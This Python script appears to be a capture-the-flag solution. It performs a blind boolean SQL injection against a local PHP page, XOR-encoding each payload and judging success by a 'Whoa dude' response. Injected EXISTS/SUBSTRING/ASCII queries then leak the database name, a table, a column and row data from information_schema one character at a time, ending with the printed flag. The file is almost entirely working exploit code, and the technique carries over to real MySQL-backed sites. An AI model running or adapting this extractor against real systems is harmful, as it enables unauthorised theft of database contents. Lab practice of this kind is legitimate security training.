#Import HTTP Requests library to work with server
import requests

#Encode Requests
def xor(data, key):

    input_str = data
    key = key
    no_of_itr = len(input_str)
    output_str = ""


    for i in range(no_of_itr):
        current = input_str[i]
        current_key = key[i%len(key)]
        output_str += chr(ord(current) ^ ord(current_key))

    return output_str

#Define the URL of the target
targetURL = "http://localhost/index.php"

#Test connetion
result = requests.get(targetURL)
#print(result.status_code)

#Identify Sucessfull exploit by greping the output for sign of success.
def runQuery(username):
    converted_user = xor(username, "12")
    data = {'value':converted_user}
    result_2 = requests.get(targetURL,data)
    if("Whoa dude" in result_2.text):
        return True
    return False

#Verify SQL exploit and success check function
#username1 = " ' OR 1=1 -- "
username1 = "' or 1=1 -- "
#print(runQuery(username1))

#This function generates strings from a list of characters
def makeStr(arr):
    name = ""
    for x in arr:
        name += x
    return name

#This function transforms the multi-dimentsional array my exploit function returns into a char list
def makeChar(arr):
    char_list = []
    for x in arr:
        i = chr(x[1])
        char_list.append(i)
    return char_list


#This function defines the expoit. output will store the leaked value.

def exploit(type, db, table, col):
    output = []
    #x stores the charecter index of the character we are looking to identify relative to the string of data we are leaking
    for x in range(20):
        #i stores the potential ASCII codes of the charecter we aim to identify. We check it against the ASCII value of the character at index X
        for i in range(20, 200):

            if (type == 0):
                #This line will leak a table name from an information scheme. Change offset to identify other tables. Uncomment to use
                username = " ' OR EXISTS(SELECT table_schema FROM (SELECT table_schema FROM information_schema.tables WHERE TABLE_SCHEMA NOT IN ('information_schema', 'performance_schema', 'mysql', 'sys') LIMIT 1 OFFSET 1) as b where ASCII(SUBSTRING(b.TABLE_SCHEMA, "+str(x)+", 1)) = "+str(i)+") -- "

            if (type == 1):
                #This line will leak a table name from an information scheme. Change offset to identify other tables. Uncomment to use
                username = " ' OR EXISTS(SELECT table_name FROM (SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA = '"+db+"') as b where ASCII(SUBSTRING(b.TABLE_NAME, "+str(x)+", 1)) = "+str(i)+") -- "

            if (type == 2):
                # This line will leak a column name from the selected table. Change offset for other column names. Unncoment to use
                username = " ' OR EXISTS (SELECT COLUMN_NAME FROM (SELECT * FROM information_schema.columns where table_name = '"+table+"' LIMIT 1 OFFSET 1) as b where ASCII(SUBSTRING(b.COLUMN_NAME, "+str(x)+", 1)) = "+str(i)+") -- "

            if (type == 3):
                #This line will leak data from the selected table & collumn. Change offset to access other rows. Uncomment to use.
                username = " ' OR EXISTS(SELECT "+col+" FROM (SELECT * FROM "+table+" LIMIT 1 OFFSET 0) as b where ASCII(SUBSTRING(b."+col+", "+str(x)+", 1)) = "+str(i)+") -- "

            #This if statement calls the verification function using the constructed input. If it returns true, the index and character ascii value are added to the array.
            if(runQuery(username)):
                output.append([x, i])
    return output

#data is defined as the data we leak from the exploit
#data = exploit()

#Here we print the original array of data, which should contain ascii values and char indexs. Each char index should be unique
#print(data)

#Here we turn the array into a string and print the string.
#data = makeStr(makeChar(data))
#print(data)

db = makeStr(makeChar(exploit(0,'','', '')))
#print(db)

table = makeStr(makeChar(exploit(1, db, '', '')))
#print(table)

col = makeStr(makeChar(exploit(2, '', table, '')))
#print(col)

flag = makeStr(makeChar(exploit(3, '', table, col)))
print("The Flag is: ", flag)
